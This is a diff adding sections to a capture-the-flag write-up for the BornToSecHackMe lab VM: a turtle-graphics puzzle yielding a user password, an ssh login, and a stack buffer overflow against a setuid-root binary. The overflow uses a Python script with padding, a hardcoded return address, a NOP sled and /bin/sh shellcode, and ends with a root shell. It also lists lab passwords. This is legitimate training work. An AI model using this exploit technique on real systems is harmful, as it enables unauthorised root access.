@@ -674,3 +674,85 @@ if __name__ == "__main__":
 
 The output will be "opukmq" and we can provide it to the bomb to access the to the last phase.
 
+> TO ADD: The last phase. password: Publicspeakingisveryeasy.126241207201b2149opekmq426135
+
+## The Turtle
+
+Now, we have an access to the thor home, we will check what is present on it:
+
+```bash
+thor@BornToSecHackMe:~$ ls
+README  turtle
+thor@BornToSecHackMe:~$ cat README
+Finish this challenge and use the result as password for 'zaz' user.
+thor@BornToSecHackMe:~$ cat turtle
+Tourne gauche de 90 degrees
+Avance de 50
+[...]
+Can you digest the message? :)
+```
+
+After some research, we can find that turtle is a lib to draw with python
+We will now write a script that will reproduce the instructions given in the turtle file:
+
+```python
+  import turtle
+  t = turtle.Turtle()
+
+  [...]
+  t.right(90)
+  t.forward(100)
+  t.backward(200)
+```
+
+The turtle is drawing the word SLASH, we will convert it to md5 and we will have the password for the zaz user.
+
+```bash
+ssh zaz@192.168.56.101
+password: 646da671ca01bb5d84dbb5fb2238dc8e
+zaz@BornToSecHackMe:~$ ls
+exploit_me  mail
+```
+
+We're now connected as zaz!
+
+## Exploit me
+
+  
+  ```bash
+  zaz@BornToSecHackMe:~$ ls -l exploit_me
+  -rwsr-s--- 1 root zaz 4880 Oct  8  2015 exploit_me
+  ```
+
+We can see that the binary is setuid, so we can execute it as root. We can also see that the binary is owned by zaz, so we can try to exploit it.
+
+We will do a buffer overflow to overwrite the return address and redirect it to the shellcode. We made a little script to do it:
+
+```python
+
+import struct
+
+# We fill the buffer of the first argument (140 char)
+pad = "\x41" * 140
+
+# We set the adress of the extended instruction pointer to the end of the allowed space of the previous buffer
+EIP = struct.pack("I", 0xbffff6A0)
+
+# We set 100 "No Operator" to avoid any diruption of the program
+NOP = "\x90" * 100
+
+# Inject the shell code to run /bin/sh
+shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+
+# We display it to run it on the console
+print(pad + EIP + NOP + shellcode)
+```
+
+./exploit_me $(python exploit.py)
+
+```bash
+zaz@BornToSecHackMe:~$ whoami
+root
+```
+
+We are now root!
